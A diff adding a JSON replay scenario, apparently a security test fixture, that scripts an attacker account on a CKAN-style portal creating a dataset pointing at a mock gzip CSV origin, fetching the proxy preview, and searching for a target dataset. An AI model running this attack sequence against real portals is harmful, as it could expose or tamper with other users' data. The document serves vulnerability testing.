@@ -1,0 +1,89 @@
+{
+  "version": 1,
+  "origin": {
+    "routes": [
+      {
+        "path": "/probe.csv.gz",
+        "HEAD": {
+          "status": 200,
+          "headers": [
+            [
+              "Content-Type",
+              "text/csv"
+            ],
+            [
+              "Content-Encoding",
+              "gzip"
+            ],
+            [
+              "Content-Length",
+              "62"
+            ]
+          ]
+        },
+        "GET": {
+          "status": 200,
+          "headers": [
+            [
+              "Content-Type",
+              "text/csv"
+            ],
+            [
+              "Content-Encoding",
+              "gzip"
+            ],
+            [
+              "Content-Length",
+              "62"
+            ]
+          ],
+          "wire_body_b64": "H4sIAAAAAAAC/8tJTErN0SlLzClN5crJT07M0S0oyk9K1cnOyy/P0y0oTcrJTNZNSSxJ5AIAkuX99yoAAAA="
+        }
+      }
+    ]
+  },
+  "operations": [
+    {
+      "mode": "http",
+      "method": "POST",
+      "path": "/api/3/action/package_create",
+      "headers": [
+        [
+          "Authorization",
+          "${ATTACKER_TOKEN}"
+        ],
+        [
+          "Content-Type",
+          "application/json"
+        ]
+      ],
+      "json": {
+        "name": "attacker-gzip-preview-replay",
+        "title": "Attacker gzip preview replay",
+        "owner_org": "${ATTACKER_ORG_ID}",
+        "resources": [
+          {
+            "name": "gzip CSV probe",
+            "url": "${ORIGIN_BASE}/probe.csv.gz",
+            "format": "CSV"
+          }
+        ]
+      },
+      "extract": {
+        "resource_id": "/result/resources/0/id"
+      }
+    },
+    {
+      "mode": "raw_capture",
+      "method": "GET",
+      "path": "/dataset/attacker-gzip-preview-replay/resource/${resource_id}/proxy",
+      "name": "own_csv_preview"
+    },
+    {
+      "mode": "raw_capture",
+      "method": "GET",
+      "path": "/api/3/action/package_search?q=quarterly-energy-disclosure-2026&rows=10",
+      "name": "target_label_search"
+    }
+  ]
+}
